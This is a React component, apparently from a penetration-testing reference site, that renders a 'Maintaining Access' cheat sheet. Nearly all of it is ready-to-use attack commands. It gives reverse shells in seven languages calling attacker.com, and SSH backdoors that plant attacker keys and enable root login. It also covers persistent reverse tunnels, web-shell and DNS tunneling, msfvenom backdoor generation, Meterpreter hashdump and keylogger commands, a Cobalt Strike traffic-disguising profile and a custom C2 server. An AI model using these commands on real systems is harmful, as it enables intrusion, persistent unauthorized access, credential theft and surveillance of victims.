
import React from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/tabs';
import { Key, Server, Globe, Lock } from 'lucide-react';
import CodeExample from '@/components/CodeExample';

const MaintainingAccess: React.FC = () => {
  return (
    <Card className="bg-cybr-card border-cybr-muted">
      <CardHeader>
        <CardTitle className="text-cybr-primary flex items-center gap-2">
          <Key className="h-6 w-6" />
          Maintaining Access
        </CardTitle>
      </CardHeader>
      <CardContent className="space-y-6">
        <Tabs defaultValue="remote-access" className="w-full">
          <TabsList className="grid grid-cols-3 w-full">
            <TabsTrigger value="remote-access">Remote Access</TabsTrigger>
            <TabsTrigger value="tunneling">Tunneling</TabsTrigger>
            <TabsTrigger value="c2-framework">C2 Framework</TabsTrigger>
          </TabsList>

          <TabsContent value="remote-access" className="space-y-4">
            <h3 className="text-xl font-semibold text-cybr-primary">Remote Access Tools</h3>
            
            <div className="space-y-4">
              <h4 className="text-lg font-medium text-cybr-secondary">Reverse Shells</h4>
              <CodeExample
                language="bash"
                title="Multi-Platform Reverse Shells"
                code={`# Bash reverse shell
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Netcat reverse shell
nc -e /bin/bash attacker.com 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

# PHP reverse shell
php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

# Perl reverse shell
perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'

# Ruby reverse shell
ruby -rsocket -e'f=TCPSocket.open("attacker.com",4444).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'

# PowerShell reverse shell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`}
              />

              <h4 className="text-lg font-medium text-cybr-secondary">SSH Backdoors</h4>
              <CodeExample
                language="bash"
                title="SSH Persistence Techniques"
                code={`# Authorized keys backdoor
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... attacker@evil.com" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# SSH key generation
ssh-keygen -t rsa -b 4096 -f ~/.ssh/backdoor_key -N ""
cat ~/.ssh/backdoor_key.pub >> ~/.ssh/authorized_keys

# SSH config modification
echo "Host *" >> ~/.ssh/config
echo "    StrictHostKeyChecking no" >> ~/.ssh/config
echo "    UserKnownHostsFile=/dev/null" >> ~/.ssh/config

# SSH daemon backdoor
# Modify /etc/ssh/sshd_config
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
echo "AllowUsers root attacker" >> /etc/ssh/sshd_config
systemctl restart sshd

# SSH tunnel persistence
# Create tunnel on boot
echo "@reboot ssh -R 8080:localhost:22 attacker@evil.com" | crontab -

# Port knocking SSH
# Configure port knocking sequence
iptables -A INPUT -p tcp --dport 22 -j DROP
iptables -I INPUT -p tcp --dport 1234 -m recent --name knock1 --set -j DROP
iptables -I INPUT -p tcp --dport 5678 -m recent --name knock1 --rcheck -m recent --name knock2 --set -j DROP
iptables -I INPUT -p tcp --dport 9999 -m recent --name knock2 --rcheck -m recent --name knock3 --set -j DROP
iptables -I INPUT -p tcp --dport 22 -m recent --name knock3 --rcheck -j ACCEPT`}
              />
            </div>
          </TabsContent>

          <TabsContent value="tunneling" className="space-y-4">
            <h3 className="text-xl font-semibold text-cybr-primary">Network Tunneling</h3>
            
            <div className="space-y-4">
              <h4 className="text-lg font-medium text-cybr-secondary">SSH Tunneling</h4>
              <CodeExample
                language="bash"
                title="SSH Tunnel Techniques"
                code={`# Local port forwarding
ssh -L 8080:target.internal:80 user@jumphost

# Remote port forwarding
ssh -R 9999:localhost:22 user@attacker.com

# Dynamic port forwarding (SOCKS proxy)
ssh -D 1080 user@jumphost

# SSH tunnel with autossh for persistence
autossh -M 20000 -R 9999:localhost:22 user@attacker.com

# SSH tunnel through multiple hops
ssh -J jumphost1,jumphost2 user@target

# SSH tunnel with compression
ssh -C -L 8080:target:80 user@jumphost

# Reverse SSH tunnel
# On target machine
ssh -R 19999:localhost:22 user@attacker.com

# On attacker machine
ssh -p 19999 user@localhost

# SSH tunnel with key authentication
ssh -i /path/to/key -L 8080:target:80 user@jumphost

# Persistent SSH tunnel service
cat > /etc/systemd/system/ssh-tunnel.service << EOF
[Unit]
Description=SSH Tunnel
After=network.target

[Service]
Type=simple
User=nobody
ExecStart=/usr/bin/ssh -NT -R 9999:localhost:22 user@attacker.com
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

systemctl enable ssh-tunnel.service
systemctl start ssh-tunnel.service`}
              />

              <h4 className="text-lg font-medium text-cybr-secondary">HTTP/HTTPS Tunneling</h4>
              <CodeExample
                language="bash"
                title="HTTP Tunneling Techniques"
                code={`# ngrok tunneling
ngrok tcp 22
ngrok http 80

# chisel tunneling
# On attacker machine (server)
chisel server -p 8080 --reverse

# On target machine (client)
chisel client attacker.com:8080 R:9999:localhost:22

# stunnel for HTTPS tunneling
# /etc/stunnel/stunnel.conf
echo "cert = /path/to/cert.pem" > /etc/stunnel/stunnel.conf
echo "key = /path/to/key.pem" >> /etc/stunnel/stunnel.conf
echo "[https]" >> /etc/stunnel/stunnel.conf
echo "accept = 443" >> /etc/stunnel/stunnel.conf
echo "connect = 127.0.0.1:80" >> /etc/stunnel/stunnel.conf

# HTTP tunnel using netcat
# Server side
nc -l -p 8080 -c "nc target.com 80"

# Client side
nc proxy.com 8080

# socat tunneling
socat TCP-LISTEN:8080,fork TCP:target.com:80

# reGeorg web shell tunneling
# Upload reGeorg tunnel.php to web server
python reGeorgSocksProxy.py -p 8080 -u http://target.com/tunnel.php

# DNS tunneling with iodine
# Server side
iodined -f -c -P password 10.0.0.1 tunnel.domain.com

# Client side
iodine -f -P password tunnel.domain.com`}
              />
            </div>
          </TabsContent>

          <TabsContent value="c2-framework" className="space-y-4">
            <h3 className="text-xl font-semibold text-cybr-primary">Command & Control Frameworks</h3>
            
            <div className="space-y-4">
              <h4 className="text-lg font-medium text-cybr-secondary">Metasploit Framework</h4>
              <CodeExample
                language="bash"
                title="Metasploit C2 Setup"
                code={`# Generate payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f exe > backdoor.exe

# Set up multi/handler
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST attacker.com
set LPORT 4444
set ExitOnSession false
exploit -j

# Meterpreter commands
sysinfo
getuid
ps
migrate <pid>
hashdump
screenshot
webcam_snap
keylogger_start
portfwd add -l 8080 -p 80 -r target.internal

# Persistence module
use exploit/windows/local/persistence
set session 1
set PAYLOAD_TYPE VBS
set STARTUP USER
exploit

# Pivoting through meterpreter
route add 192.168.1.0 255.255.255.0 1
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set THREADS 10
run`}
              />

              <h4 className="text-lg font-medium text-cybr-secondary">Cobalt Strike</h4>
              <CodeExample
                language="bash"
                title="Cobalt Strike Beacon"
                code={`# Start team server
./teamserver attacker.com password malleable.profile

# Generate beacon payload
Attacks -> Packages -> Windows Executable (S)
Listener: http/https beacon
Host: attacker.com
Port: 80/443

# Beacon commands
shell whoami
powershell Get-Process
screenshot
keylogger
hashdump
mimikatz
elevate
spawn
inject

# Malleable C2 profile
set sleeptime "5000";
set jitter    "10";
set maxdns    "255";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

http-get {
    set uri "/api/v1/status";
    client {
        header "Host" "legitimate.com";
        header "Accept" "*/*";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Accept-Encoding" "gzip, deflate";
        header "Connection" "keep-alive";
    }
    server {
        header "Server" "nginx/1.18.0";
        header "Content-Type" "application/json";
        output {
            print;
        }
    }
}`}
              />

              <h4 className="text-lg font-medium text-cybr-secondary">Custom C2 Framework</h4>
              <CodeExample
                language="python"
                title="Simple Custom C2 Server"
                code={`import socket
import threading
import base64
import json
import time

class C2Server:
    def __init__(self, host='0.0.0.0', port=8080):
        self.host = host
        self.port = port
        self.clients = []
        self.commands = {}
        
    def start_server(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(5)
        print(f"[+] C2 Server listening on {self.host}:{self.port}")
        
        while True:
            client, addr = server.accept()
            print(f"[+] New client connected: {addr}")
            self.clients.append(client)
            thread = threading.Thread(target=self.handle_client, args=(client, addr))
            thread.start()
    
    def handle_client(self, client, addr):
        while True:
            try:
                # Receive data from client
                data = client.recv(4096)
                if not data:
                    break
                
                # Decode and process command
                decoded_data = base64.b64decode(data).decode()
                response = json.loads(decoded_data)
                
                # Process response
                if response['type'] == 'heartbeat':
                    self.send_command(client, 'heartbeat_ack')
                elif response['type'] == 'command_result':
                    print(f"[+] Command result from {addr}: {response['data']}")
                
                # Check for pending commands
                if addr in self.commands:
                    command = self.commands.pop(addr)
                    self.send_command(client, command)
                    
            except Exception as e:
                print(f"[!] Error handling client {addr}: {e}")
                break
        
        client.close()
        self.clients.remove(client)
        print(f"[-] Client {addr} disconnected")
    
    def send_command(self, client, command):
        message = {
            'type': 'command',
            'data': command,
            'timestamp': time.time()
        }
        encoded_message = base64.b64encode(json.dumps(message).encode())
        client.send(encoded_message)
    
    def add_command(self, client_addr, command):
        self.commands[client_addr] = command

# Usage
if __name__ == "__main__":
    c2 = C2Server()
    c2.start_server()`}
              />
            </div>
          </TabsContent>
        </Tabs>
      </CardContent>
    </Card>
  );
};

export default MaintainingAccess;
